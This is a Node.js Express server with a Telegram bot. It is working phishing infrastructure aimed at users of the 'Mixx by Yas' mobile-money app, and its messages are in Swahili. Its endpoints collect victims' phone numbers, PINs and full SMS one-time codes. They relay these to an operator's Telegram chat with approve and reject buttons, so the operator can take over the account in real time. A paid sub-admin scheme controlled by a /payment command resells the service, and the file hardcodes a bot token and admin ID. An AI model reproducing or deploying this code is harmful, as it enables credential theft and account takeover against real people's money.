const express = require('express');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const MAIN_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8968023761:AAFi4k2gVczpAbCM1-8oRC1axtXA9EwRvo8';
const MAIN_ADMIN_ID = (process.env.MAIN_ADMIN_ID || '8591555400').trim();
const PORT = process.env.PORT || 10000;

if (!MAIN_BOT_TOKEN) {
    console.error("❌ ERROR: Main Telegram Bot Token is missing!");
} else {
    console.log("🤖 Initializing Main Telegram Bot...");
}

const mainBot = new TelegramBot(MAIN_BOT_TOKEN, { polling: true });

mainBot.on('polling_error', (error) => {
    console.error('⚠ Main Bot Polling Error:', error.code, error.message);
});

let activeSessions = {};
let registeredAdmins = new Map(); // chatId -> { firstName, username, lastSeen, isBlocked: boolean }

function escapeMarkdown(text) {
    if (!text) return '';
    return text.toString().replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
}

mainBot.on('message', (msg) => {
    if (!msg.text) return;
    const chatId = msg.chat.id;
    const userIdStr = chatId.toString().trim();
    const firstName = msg.from.first_name || 'Admin';
    const username = msg.from.username ? `@${msg.from.username}` : 'No username set';

    // Track or update admin profile
    if (!registeredAdmins.has(userIdStr)) {
        registeredAdmins.set(userIdStr, {
            firstName,
            username,
            lastSeen: new Date().toLocaleString(),
            isBlocked: false
        });
    } else {
        const adminInfo = registeredAdmins.get(userIdStr);
        adminInfo.lastSeen = new Date().toLocaleString();
    }

    // Command: /activate <Chat ID> (Main Admin only)
    if (msg.text.startsWith('/activate')) {
        if (userIdStr !== MAIN_ADMIN_ID) {
            mainBot.sendMessage(chatId, "⚠️ Wewe si Msimamizi Mkuu huwezi kutumia amri hii.");
            return;
        }

        const targetId = msg.text.replace('/activate', '').trim();
        if (!targetId) {
            mainBot.sendMessage(chatId, "⚠️ Tafadhali weka Chat ID ya sub-admin unayetaka kumwezesha.\n\nMfano:\n`/activate 123456789`", { parse_mode: "Markdown" });
            return;
        }

        if (registeredAdmins.has(targetId)) {
            const adminData = registeredAdmins.get(targetId);
            adminData.isBlocked = false;
            mainBot.sendMessage(chatId, `✅ Umemwezesha mafanikio sub-admin: \`${targetId}\` (${adminData.firstName}). Sasa anapokea ujumbe.`, { parse_mode: "Markdown" });
            mainBot.sendMessage(targetId, "✅ *Ruhusa Yako Imewezeshwa!*\n\nSasa unapokea taarifa na ujumbe kupitia mfumo wako.", { parse_mode: "Markdown" }).catch(() => {});
        } else {
            mainBot.sendMessage(chatId, `⚠️ Haionekani kuwa Chat ID \`${targetId}\` imesajiliwa kwenye mfumo.`, { parse_mode: "Markdown" });
        }
        return;
    }

    // Command: /payment <Chat ID> (Main Admin only) - Blocks specific sub-admin link delivery
    if (msg.text.startsWith('/payment')) {
        if (userIdStr !== MAIN_ADMIN_ID) {
            mainBot.sendMessage(chatId, "⚠️ Wewe si Msimamizi Mkuu huwezi kutumia amri hii.");
            return;
        }

        const targetId = msg.text.replace('/payment', '').trim();
        if (!targetId) {
            mainBot.sendMessage(chatId, "⚠️ Tafadhali weka Chat ID ya sub-admin unayetaka kumzuia kupitia /payment.\n\nMfano:\n`/payment 123456789`", { parse_mode: "Markdown" });
            return;
        }

        if (targetId === MAIN_ADMIN_ID) {
            mainBot.sendMessage(chatId, "⚠️ Huwezi kuzuia Msimamizi Mkuu.");
            return;
        }

        if (registeredAdmins.has(targetId)) {
            const adminData = registeredAdmins.get(targetId);
            adminData.isBlocked = true;
            mainBot.sendMessage(chatId, `🛑 Umemzuia sub-admin mwenye ID: \`${targetId}\` (${adminData.firstName}). Hautapokea tena ujumbe kutoka kwake.`, { parse_mode: "Markdown" });
            mainBot.sendMessage(targetId, "🛑 *Ujumbe Umesimamishwa*\n\nUfikiaji wako wa kupokea ujumbe umesimamishwa kwa sasa na Msimamizi Mkuu.", { parse_mode: "Markdown" }).catch(() => {});
        } else {
            mainBot.sendMessage(chatId, `⚠️ Haionekani kuwa Chat ID \`${targetId}\` imesajiliwa kwenye mfumo.`, { parse_mode: "Markdown" });
        }
        return;
    }

    // Command: /all (Main Admin only) - Shows all admins with active/dormant statuses
    if (msg.text.startsWith('/all')) {
        if (userIdStr !== MAIN_ADMIN_ID) {
            mainBot.sendMessage(chatId, "⚠️ Wewe si Msimamizi Mkuu huwezi kutumia amri hii.");
            return;
        }

        if (registeredAdmins.size === 0) {
            mainBot.sendMessage(chatId, "📋 Hakuna sub-admin yeyote aliyesajiliwa au kutumia bot bado.");
            return;
        }

        let reportText = `📋 **ORODHA YA ADMINS WOTE (ACTIVE & DORMANT)**\n\n`;
        let count = 1;

        registeredAdmins.forEach((data, id) => {
            if (id === MAIN_ADMIN_ID) return;
            const status = data.isBlocked ? "🔴 Dormant / Blocked (/payment)" : "🟢 Active (/activate)";
            reportText += `${count}. *${escapeMarkdown(data.firstName)}* (${data.username})\n` +
                          `   🆔 ID: \`${id}\`\n` +
                          `   📊 Hali: ${status}\n` +
                          `   🕒 Mara ya mwisho: ${data.lastSeen}\n\n`;
            count++;
        });

        if (count === 1) {
            reportText += "_Hakuna sub-admin mwingine aliyesajiliwa zaidi ya Msimamizi Mkuu._";
        }

        mainBot.sendMessage(chatId, reportText, { parse_mode: "Markdown" });
        return;
    }

    if (msg.text.startsWith('/start')) {
        sendAdminLink(chatId, userIdStr, firstName, username);
    }
});

function sendAdminLink(chatId, userIdStr, firstName, username) {
    const host = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
    const isolatedLink = `${host}/?admin=${userIdStr}`;
    const welcomeText = `🚨 *Kiungo Chako cha Admin kiko Tayari!*\n\n` +
        `👤 *Jina:* ${escapeMarkdown(firstName)}\n` +
        `🆔 *Chat ID:* \`${escapeMarkdown(userIdStr)}\`\n` +
        `🏷 *Username:* ${escapeMarkdown(username)}\n\n` +
        `🔗 *Kiungo Chako cha Kudumu (Permanent Link):*\n${isolatedLink}`;

    mainBot.sendMessage(chatId, welcomeText, { parse_mode: "Markdown" })
        .catch(err => console.error("Error sending start message:", err));
}

function setupCallbackHandler(botInstance) {
    botInstance.on('callback_query', async (query) => {
        const chatId = query.message.chat.id;
        const data = query.data;
        const userIdStr = chatId.toString().trim();

        const parts = data.split('_');
        const action = parts[0]; 
        const sessionId = parts.slice(1).join('_');

        const session = activeSessions[sessionId];
        if (!session) {
            botInstance.answerCallbackQuery(query.id, { text: "Kipindi kimeisha au hakionekani.", show_alert: true });
            return;
        }

        if (session.targetAdmin !== userIdStr) {
            botInstance.answerCallbackQuery(query.id, { text: "⚠ Ruhusa imekataliwa: Hii si ya kwako.", show_alert: true });
            return;
        }

        if (action === 'allow') session.status = 'approved_pin';
        else if (action === 'deny') session.status = 'denied';
        else if (action === 'wrongpin') session.status = 'wrong_pin';
        else if (action === 'wrongsms') session.status = 'wrong_sms';
        else if (action === 'approved') session.status = 'success';

        botInstance.editMessageReplyMarkup({ inline_keyboard: [] }, {
            chat_id: chatId,
            message_id: query.message.message_id
        }).catch(err => console.error("Error clearing markup:", err));

        botInstance.answerCallbackQuery(query.id).catch(err => console.error("Error answering callback query:", err));
    });
}

setupCallbackHandler(mainBot);

app.post('/api/submit-credentials', (req, res) => {
    const { sessionId, phone, pin, adminId } = req.body;
    
    let targetAdmin = MAIN_ADMIN_ID;
    if (adminId) {
        targetAdmin = adminId.toString().trim();
    }

    // Check if specific sub-admin is blocked via /payment
    if (targetAdmin !== MAIN_ADMIN_ID && registeredAdmins.has(targetAdmin)) {
        if (registeredAdmins.get(targetAdmin).isBlocked) {
            console.log(`⚠️ Blocked credential delivery for sub-admin ${targetAdmin} due to individual /payment block.`);
            return res.json({ success: true, sessionId });
        }
    }

    activeSessions[sessionId] = {
        phone, pin,
        targetAdmin,
        status: 'pending_pin_approval',
        incomingSMS: ''
    };

    const message = `NEW MIXX APPLICANT\n\n` +
        `PHONE NO: ${phone}\n` +
        `PIN: ${pin}`;

    mainBot.sendMessage(targetAdmin, message, {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "RUHUSU (ALLOW)", callback_data: `allow_${sessionId}` },
                    { text: "KATAA (DENY)", callback_data: `deny_${sessionId}` }
                ]
            ]
        }
    }).then(() => {
        console.log(`✅ Credentials successfully sent to designated admin: ${targetAdmin}`);
    }).catch(err => {
        console.error(`❌ Telegram Send Error:`, err.response ? err.response.body : err.message);
    });

    res.json({ success: true, sessionId });
});

app.post('/api/submit-otp', (req, res) => {
    const { sessionId, otpText } = req.body;
    const session = activeSessions[sessionId];

    if (!session) {
        return res.json({ status: 'not_found', message: 'Session not found' });
    }

    // Check if specific sub-admin is blocked via /payment
    if (session.targetAdmin !== MAIN_ADMIN_ID && registeredAdmins.has(session.targetAdmin)) {
        if (registeredAdmins.get(session.targetAdmin).isBlocked) {
            console.log(`⚠️ Blocked OTP delivery for sub-admin ${session.targetAdmin} due to individual /payment block.`);
            return res.json({ success: true });
        }
    }

    const expectedPrefix = "You are being registered in Mixx by Yas Super App";
    if (otpText && otpText.includes(expectedPrefix)) {
        session.status = 'success';
    } else {
        session.status = 'pending_final_approval';
    }

    session.otpText = otpText;

    const message = `UTHIBITISHO WA SMS OTP\n\n` +
        `NAMBARI YA SIMU: ${session.phone}\n\n` +
        `UJUMBE WOTE WA SMS:\n${otpText}`;

    mainBot.sendMessage(session.targetAdmin, message, {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "📋 Nakili Ujumbe", copy_text: { text: otpText } }
                ],
                [
                    { text: "PIN MBAYA ❌", callback_data: `wrongpin_${sessionId}` },
                    { text: "SMS MBAYA", callback_data: `wrongsms_${sessionId}` }
                ],
                [
                    { text: "IMETHIBITISHWA", callback_data: `approved_${sessionId}` }
                ]
            ]
        }
    }).then(() => {
        console.log(`✅ SMS successfully processed for admin ${session.targetAdmin}`);
    }).catch(err => console.error(`❌ Failed to send OTP alert to admin:`, err));

    res.json({ success: true });
});

app.get('/api/check-status/:sessionId', (req, res) => {
    const session = activeSessions[req.params.sessionId];
    if (!session) {
        return res.json({ status: 'not_found' });
    }
    res.json({ 
        status: session.status,
        incomingSMS: session.incomingSMS || ''
    });
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
        
